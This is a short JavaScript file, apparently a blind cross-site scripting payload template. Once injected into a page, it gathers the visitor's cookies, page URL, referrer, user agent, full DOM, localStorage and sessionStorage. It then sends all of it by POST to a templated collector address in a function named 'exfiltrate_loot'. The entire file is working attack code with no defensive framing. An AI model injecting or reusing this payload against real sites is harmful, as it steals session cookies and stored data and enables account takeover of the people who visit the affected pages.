(function () {
    console.log("Wilkomen bruva");

    var collected_data = {};

    function return_value(value) {
        return (value !== undefined) ? value : ""
    }


    function collect_data() {
        collected_data["Cookies"] = collected_data["Location"] = collected_data["Referrer"] = collected_data["User-Agent"] = collected_data["Browser Time"] = collected_data["Origin"] = collected_data["DOM"] = collected_data["localStorage"] = collected_data["sessionStorage"] = "";

        try { collected_data["Location"] = return_value(location.toString()) } catch(e) {}
        try { collected_data["Cookies"] = return_value(document.cookie) } catch(e) {}
        try { collected_data["Referrer"] = return_value(document.referrer) } catch(e) {}
        try { collected_data["User-Agent"] = return_value(navigator.userAgent); } catch(e) {}
        try { collected_data["Browser Time"] = return_value(new Date().toTimeString()); } catch(e) {}
        try { collected_data["Origin"] = return_value(location.origin); } catch(e) {}
        try { collected_data["DOM"] = return_value(document.documentElement.outerHTML); } catch(e) {}
        //collected_data["DOM"] = collected_data["DOM"].slice(0, 4096)
        try { collected_data["localStorage"] = return_value(JSON.stringify(localStorage)); } catch(e) {}
        try { collected_data["sessionStorage"] = return_value(JSON.stringify(sessionStorage)); } catch(e) {}
    }


    function exfiltrate_loot() {
        var xhr = new XMLHttpRequest();
        console.log(collected_data);
        xhr.open("POST", "{{.Url}}", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.send(JSON.stringify(collected_data));
    }

    collect_data();
    exfiltrate_loot();
})();
